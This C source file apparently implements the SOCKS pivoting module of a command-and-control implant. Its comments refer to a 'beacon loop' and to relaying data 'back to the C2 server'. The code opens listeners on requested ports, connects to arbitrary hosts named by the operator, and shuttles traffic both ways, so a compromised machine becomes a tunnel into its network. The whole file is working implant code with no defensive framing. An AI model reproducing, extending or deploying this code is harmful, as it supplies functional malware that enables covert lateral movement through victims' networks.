#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <fcntl.h>
#include <time.h>
#include "pivot.h"
#include "debug.h"
#include "commands.h" // For callback types

static socket_entry_t *g_pivot_list = NULL;
static char *g_read_buffer = NULL;
static uint32_t g_lsock_id = 0;

static uint64_t get_monotonic_ms() {
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return (uint64_t)ts.tv_sec * 1000 + (uint64_t)ts.tv_nsec / 1000000;
}

static uint32_t next_id() {
    return (g_lsock_id++ % 67108864) + 67108864;
}

static void _add_socket(int socket_fd, int id, int timeout, uint32_t ltype, uint16_t lport, int state) {
    socket_entry_t *entry = (socket_entry_t *)malloc(sizeof(socket_entry_t));
    if (!entry) {
        ERROR_PRINT("SOCKS: Failed to allocate memory for socket_entry\n");
        return;
    }

    // Set socket to non-blocking
    int flags = fcntl(socket_fd, F_GETFL, 0);
    fcntl(socket_fd, F_SETFL, flags | O_NONBLOCK);

    entry->id = id;
    entry->socket = socket_fd;
    entry->state = state;
    entry->ltype = ltype;
    entry->lport = lport;
    entry->start_time = get_monotonic_ms();
    entry->timeout = timeout;
    entry->linger_time = 0;
    entry->next = g_pivot_list;
    g_pivot_list = entry;

    DEBUG_PRINT("[SOCKS] Added socket fd:%d with id:%u to pivot list (state: %d)\n", socket_fd, id, state);
}

static int generic_listen(uint32_t bindto, uint16_t port, int backlog) {
    int sock_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (sock_fd < 0) {
        ERROR_PRINT("SOCKS: socket() failed: %s\n", strerror(errno));
        return -1;
    }

    // Allow reuse of address
    int opt = 1;
    if (setsockopt(sock_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt)) < 0) {
        ERROR_PRINT("SOCKS: setsockopt(SO_REUSEADDR) failed: %s\n", strerror(errno));
        close(sock_fd);
        return -1;
    }

    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = bindto;

    if (bind(sock_fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        ERROR_PRINT("SOCKS: bind() failed for port %d: %s\n", port, strerror(errno));
        close(sock_fd);
        return -1;
    }

    if (listen(sock_fd, backlog) < 0) {
        ERROR_PRINT("SOCKS: listen() failed: %s\n", strerror(errno));
        close(sock_fd);
        return -1;
    }
    
    DEBUG_PRINT("[SOCKS] generic_listen on port %d successful (fd: %d)\n", port, sock_fd);
    return sock_fd;
}

static void pivot_poll_checker(pivot_callback callback) {
    fd_set fds_read, fds_write, fds_error;
    struct timeval tv = {0, 10 * 1000}; // 10ms timeout
    int max_fd = 0;
    socket_entry_t *temp = g_pivot_list;

    FD_ZERO(&fds_read);
    FD_ZERO(&fds_write);
    FD_ZERO(&fds_error);

    while (temp != NULL) {
        if (temp->state == STATE_CONNECT) {
            FD_SET(temp->socket, &fds_read);
            FD_SET(temp->socket, &fds_write);
            FD_SET(temp->socket, &fds_error);
            if (temp->socket > max_fd) max_fd = temp->socket;
        }
        temp = temp->next;
    }
    
    if (max_fd == 0) return;

    int ret = select(max_fd + 1, &fds_read, &fds_write, &fds_error, &tv);
    if (ret < 0) {
        ERROR_PRINT("[SOCKS] checker select() error: %s\n", strerror(errno));
        return;
    }
    if (ret == 0) return;

    temp = g_pivot_list;
    while (temp != NULL) {
        socket_entry_t* next = temp->next; // Save next pointer in case temp is modified
        if (temp->state != STATE_CONNECT) {
            temp = next;
            continue;
        }

        uint32_t fid_be = htonl(temp->id);

        if (FD_ISSET(temp->socket, &fds_error)) {
            DEBUG_PRINT("[SOCKS] id:%u (fd:%d) dead on arrival (error set).\n", temp->id, temp->socket);
            temp->state = STATE_DEAD;
            callback((char *)&fid_be, sizeof(fid_be), CALLBACK_CLOSE);
        } else if (temp->ltype == LISTEN_ONEOFF) { // This is a listening socket
            if (FD_ISSET(temp->socket, &fds_read)) {
                int lsock = temp->socket;
                int new_sock = accept(lsock, NULL, NULL);
                if (new_sock < 0) {
                    DEBUG_PRINT("[SOCKS] accept() failed for listener id:%u (fd:%d): %s\n", temp->id, lsock, strerror(errno));
                    temp->state = STATE_DEAD;
                    callback((char *)&fid_be, sizeof(fid_be), CALLBACK_CLOSE);
                } else {
                    DEBUG_PRINT("[SOCKS] Accepted new connection (fd:%d) for listener id:%u. Replacing socket in pivot entry.\n", new_sock, temp->id);
                    temp->socket = new_sock; 
                    temp->state = STATE_READ;
                    temp->ltype = LISTEN_NOTREALLY;
                    close(lsock);
                    callback((char *)&fid_be, sizeof(fid_be), CALLBACK_CONNECT);
                }
            }
        } else { // This is an outgoing connecting socket
            if (FD_ISSET(temp->socket, &fds_write)) {
                int so_error;
                socklen_t len = sizeof(so_error);
                getsockopt(temp->socket, SOL_SOCKET, SO_ERROR, &so_error, &len);

                if (so_error == 0) {
                    DEBUG_PRINT("[SOCKS] Outgoing connection succeeded for id:%u (fd:%d).\n", temp->id, temp->socket);
                    temp->state = STATE_READ;
                    callback((char *)&fid_be, sizeof(fid_be), CALLBACK_CONNECT);
                } else {
                    ERROR_PRINT("[SOCKS] Outgoing connection failed for id:%u (fd:%d): %s\n", temp->id, temp->socket, strerror(so_error));
                    temp->state = STATE_DEAD;
                    callback((char *)&fid_be, sizeof(fid_be), CALLBACK_CLOSE);
                }
            }
        }

        // Check timeout
        if (temp->state == STATE_CONNECT && (get_monotonic_ms() - temp->start_time) > temp->timeout) {
            DEBUG_PRINT("[SOCKS] Connect timeout for id:%u (fd:%d)\n", temp->id, temp->socket);
            temp->state = STATE_DEAD;
            callback((char *)&fid_be, sizeof(fid_be), CALLBACK_CLOSE);
        }

        temp = next;
    }
}

static void pivot_reaper() {
    socket_entry_t *temp = g_pivot_list;
    socket_entry_t *prev = NULL;

    while (temp != NULL) {
        int should_free = 0;
        if (temp->state == STATE_DEAD && temp->linger_time == 0) {
            DEBUG_PRINT("[SOCKS] Marking id:%u (fd:%d) for reaping.\n", temp->id, temp->socket);
            temp->linger_time = get_monotonic_ms();
        } else if (temp->state == STATE_DEAD && (get_monotonic_ms() - temp->linger_time) > 1000) {
            DEBUG_PRINT("[SOCKS] Reaping id:%u (fd:%d).\n", temp->id, temp->socket);
            close(temp->socket);
            should_free = 1;
        }

        if (should_free) {
            socket_entry_t *next = temp->next;
            if (prev) {
                prev->next = next;
            } else {
                g_pivot_list = next;
            }
            free(temp);
            temp = next;
        } else {
            prev = temp;
            temp = temp->next;
        }
    }
}

static int pivot_reader(pivot_callback callback) {
    fd_set fds_read;
    struct timeval tv = {0, 100 * 1000}; // 100ms timeout
    int max_fd = 0;
    int read_something = 0;
    socket_entry_t *temp = g_pivot_list;

    FD_ZERO(&fds_read);
    while (temp != NULL) {
        if (temp->state == STATE_READ) {
            FD_SET(temp->socket, &fds_read);
            if (temp->socket > max_fd) max_fd = temp->socket;
        }
        temp = temp->next;
    }
    
    if (max_fd == 0) return 0;
    
    int ret = select(max_fd + 1, &fds_read, NULL, NULL, &tv);
    if (ret < 0) {
        ERROR_PRINT("[SOCKS] reader select() error: %s\n", strerror(errno));
        return 0;
    }
    if (ret == 0) return 0;


    if (!g_read_buffer) {
        g_read_buffer = (char *)malloc(SOCKET_READ_MAX);
    }
    if (!g_read_buffer) return 0;

    temp = g_pivot_list;
    while (temp != NULL) {
        if (temp->state == STATE_READ && FD_ISSET(temp->socket, &fds_read)) {
            uint32_t fid_be = htonl(temp->id);
            
            ssize_t count = read(temp->socket, g_read_buffer + sizeof(fid_be), SOCKET_READ_MAX - sizeof(fid_be));

            if (count > 0) {
                DEBUG_PRINT("[SOCKS] Read %zd bytes from id:%u (fd:%d)\n", count, temp->id, temp->socket);
                // Data read from the target socket needs to be sent back to the C2 server.
                // The format for this callback is:
                // [4 bytes] Socket ID (big endian)
                // [N bytes] Raw data read from the socket
                // This is then sent with the CALLBACK_READ (ID 5) type.
                memcpy(g_read_buffer, &fid_be, sizeof(fid_be));
                callback(g_read_buffer, count + sizeof(fid_be), CALLBACK_READ);
                read_something = 1;
            } else if (count == 0) {
                // EOF
                DEBUG_PRINT("[SOCKS] id:%u (fd:%d) got EOF. Closing.\n", temp->id, temp->socket);
                temp->state = STATE_DEAD;
                callback((char *)&fid_be, sizeof(fid_be), CALLBACK_CLOSE);
            } else { // count < 0
                if (errno != EAGAIN && errno != EWOULDBLOCK) {
                    ERROR_PRINT("[SOCKS] read() error on id:%u (fd:%d): %s\n", temp->id, temp->socket, strerror(errno));
                    temp->state = STATE_DEAD;
                    callback((char *)&fid_be, sizeof(fid_be), CALLBACK_CLOSE);
                }
            }
        }
        temp = temp->next;
    }

    return read_something;
}

// Public Functions
void pivot_init() {
    g_pivot_list = NULL;
    g_read_buffer = NULL;
    g_lsock_id = 0;
    DEBUG_PRINT("[SOCKS] Pivot manager initialized.\n");
}

void pivot_poll(pivot_callback callback) {
    // This is the main polling function for the SOCKS pivot manager.
    // It is called on each iteration of the main beacon loop.
    // 1. pivot_poll_checker: Checks for the status of pending connections.
    // 2. pivot_reader: Reads data from any established, active connections.
    // 3. pivot_reaper: Cleans up any connections that have been marked as dead.
    pivot_poll_checker(callback);
    pivot_reader(callback);
    pivot_reaper();
}

void pivot_cleanup() {
    socket_entry_t *temp = g_pivot_list;
    while (temp != NULL) {
        close(temp->socket);
        socket_entry_t *next = temp->next;
        free(temp);
        temp = next;
    }
    g_pivot_list = NULL;
    if (g_read_buffer) {
        free(g_read_buffer);
        g_read_buffer = NULL;
    }
    DEBUG_PRINT("[SOCKS] Pivot manager cleaned up.\n");
}

// Command Handlers
void command_listen_socks(const uint8_t *buffer, int length, pivot_callback callback) {
    if (length < 6) return;
    
    uint32_t id = ntohl(*(uint32_t*)buffer);
    uint16_t port = ntohs(*(uint16_t*)(buffer + 4));

    DEBUG_PRINT("[SOCKS] COMMAND_LISTEN on port %u for id %u\n", port, id);

    int lsock = generic_listen(INADDR_ANY, port, 1);
    if (lsock < 0) {
        uint32_t fid_be = htonl(id);
        callback((char *)&fid_be, sizeof(fid_be), CALLBACK_CLOSE);
    } else {
        _add_socket(lsock, id, 180000, LISTEN_ONEOFF, port, STATE_CONNECT);
    }
}

void command_connect_socks(const uint8_t *buffer, int length, pivot_callback callback) {
    if (length < 6) return;

    uint32_t id = ntohl(*(uint32_t*)buffer);
    uint16_t port = ntohs(*(uint16_t*)(buffer + 4));
    char *host = (char *)(buffer + 6);
    int host_len = length - 6;

    char host_z[1024];
    if (host_len >= sizeof(host_z)) host_len = sizeof(host_z) - 1;
    memcpy(host_z, host, host_len);
    host_z[host_len] = '\0';

    DEBUG_PRINT("[SOCKS] COMMAND_CONNECT to %s:%u for id %u\n", host_z, port, id);
    
    struct hostent *target = gethostbyname(host_z);
    if (!target) {
        ERROR_PRINT("[SOCKS] gethostbyname failed for %s\n", host_z);
        uint32_t fid_be = htonl(id);
        callback((char *)&fid_be, sizeof(fid_be), CALLBACK_CLOSE);
        return;
    }

    int sock_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (sock_fd < 0) {
        ERROR_PRINT("[SOCKS] socket() for outgoing connection failed: %s\n", strerror(errno));
        uint32_t fid_be = htonl(id);
        callback((char *)&fid_be, sizeof(fid_be), CALLBACK_CLOSE);
        return;
    }

    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    memcpy(&addr.sin_addr.s_addr, target->h_addr, target->h_length);

    // Set non-blocking for connect
    int flags = fcntl(sock_fd, F_GETFL, 0);
    fcntl(sock_fd, F_SETFL, flags | O_NONBLOCK);

    int ret = connect(sock_fd, (struct sockaddr *)&addr, sizeof(addr));
    if (ret < 0 && errno != EINPROGRESS) {
        ERROR_PRINT("[SOCKS] connect() to %s:%u failed: %s\n", host_z, port, strerror(errno));
        close(sock_fd);
        uint32_t fid_be = htonl(id);
        callback((char *)&fid_be, sizeof(fid_be), CALLBACK_CLOSE);
        return;
    }
    
    _add_socket(sock_fd, id, 30000, LISTEN_NOTREALLY, 0, STATE_CONNECT);
}

void command_send_socks(const uint8_t *buffer, int length) {
    if (length < 4) return;
    
    uint32_t id = ntohl(*(uint32_t*)buffer);
    socket_entry_t *temp = g_pivot_list;

    while (temp != NULL) {
        if (temp->id == id && temp->state == STATE_READ) {
            ssize_t total_written = 0;
            ssize_t to_write = length - 4;
            const uint8_t *data_ptr = buffer + 4;

            DEBUG_PRINT("[SOCKS] COMMAND_SEND for id:%u (fd:%d), %zd bytes\n", id, temp->socket, to_write);

            while (total_written < to_write) {
                ssize_t written = write(temp->socket, data_ptr + total_written, to_write - total_written);
                if (written >= 0) {
                    total_written += written;
                } else {
                    if (errno != EAGAIN && errno != EWOULDBLOCK) {
                        ERROR_PRINT("[SOCKS] write() error on id:%u (fd:%d): %s. Closing socket.\n", id, temp->socket, strerror(errno));
                        temp->state = STATE_DEAD;
                        // Don't send CALLBACK_CLOSE here, let the reaper or reader do it
                        // to avoid flooding the C2.
                        break; 
                    }
                    // If we get EAGAIN, we should ideally buffer the rest of the data and
                    // wait for the socket to be writable again. This simple loop will spin,
                    // which is not ideal, but better than dropping data.
                    usleep(10000); // Sleep 10ms to avoid busy-waiting
                }
            }
            DEBUG_PRINT("[SOCKS] Wrote %zd bytes to id:%u (fd:%d)\n", total_written, id, temp->socket);
            break;
        }
        temp = temp->next;
    }
}

void command_close_socks(const uint8_t *buffer, int length) {
    if (length < 4) return;

    uint32_t id = ntohl(*(uint32_t*)buffer);
    socket_entry_t *temp = g_pivot_list;
    DEBUG_PRINT("[SOCKS] COMMAND_CLOSE for id:%u\n", id);
    while (temp != NULL) {
        if (temp->id == id) {
            temp->state = STATE_DEAD;
            break;
        }
        temp = temp->next;
    }
}
